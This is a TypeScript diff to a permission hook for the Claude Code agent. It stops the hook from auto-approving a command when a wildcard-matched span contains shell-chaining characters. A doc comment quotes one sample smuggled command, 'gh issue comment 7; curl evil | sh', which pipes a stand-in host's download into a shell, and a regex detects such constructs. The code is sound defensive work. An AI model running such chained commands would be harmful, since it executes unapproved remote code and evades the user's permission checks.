@@ -120,6 +120,42 @@ export function commandMatchesPattern(command: string, pattern: string): boolean
 }
 
 /**
+ * Return the text each `*` in the pattern captured for this command, or null
+ * if the pattern doesn't match. Same matching as {@link commandMatchesPattern},
+ * but with the wildcards as capture groups so callers can inspect what a
+ * wildcard actually swallowed before acting on the match.
+ */
+export function wildcardSpans(command: string, pattern: string): string[] | null {
+  const regex = pattern
+    .split("*")
+    .map((part) => part.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"))
+    .join("([\\s\\S]*)");
+  const m = new RegExp(`^${regex}$`).exec(command);
+  return m ? m.slice(1) : null;
+}
+
+/**
+ * Shell metacharacters that chain, substitute, or spawn a second command:
+ * `;` `&` `|`, a newline, a backtick, or a `$(` / `<(` / `>(` opener. If one
+ * appears in what a wildcard matched, the command carries more than the
+ * registration approved (e.g. `gh issue comment 7; curl evil | sh` under a
+ * `gh issue comment *` registration).
+ */
+const SHELL_CONTROL = /[;&|`\n]|\$\(|<\(|>\(/;
+
+/**
+ * Would auto-allowing this command hand a second, unapproved command a free
+ * pass? True when a wildcard span contains a shell-control character.
+ * Deliberately conservative — it flags these even inside quotes, because the
+ * gate can't safely parse shell quoting and the cost of a false positive is a
+ * prompt, not a block.
+ */
+export function autoAllowIsUnsafe(command: string, pattern: string): boolean {
+  const spans = wildcardSpans(command, pattern);
+  return spans !== null && spans.some((s) => SHELL_CONTROL.test(s));
+}
+
+/**
  * Find the first registered pattern matching the command, or null. First
  * match wins — the file is small and append-only, so ordering is the
  * user-visible (and documented) tiebreak.
@@ -147,6 +183,24 @@ export function decideGate(
   if (!match) return null;
 
   const policy = resolvePolicy(match.action);
+
+  // An `auto` allow suppresses Claude Code's native permission dialog for the
+  // whole command. If a wildcard swallowed shell-control characters, the
+  // command runs more than the registration approved — never auto-allow that;
+  // fall back to a prompt so the backstop still fires.
+  if (policy === "auto" && autoAllowIsUnsafe(command, match.pattern)) {
+    return {
+      hookSpecificOutput: {
+        hookEventName: "PreToolUse",
+        permissionDecision: "ask",
+        permissionDecisionReason:
+          `rubber-ducky confirm gate: "${match.action}" is registered as auto, but the command ` +
+          `carries shell constructs (;, &, |, backtick, or $(…)) beyond the approved pattern — ` +
+          `prompting instead of auto-allowing: ${truncate(command, 300)}`,
+      },
+    };
+  }
+
   return {
     hookSpecificOutput: {
       hookEventName: "PreToolUse",
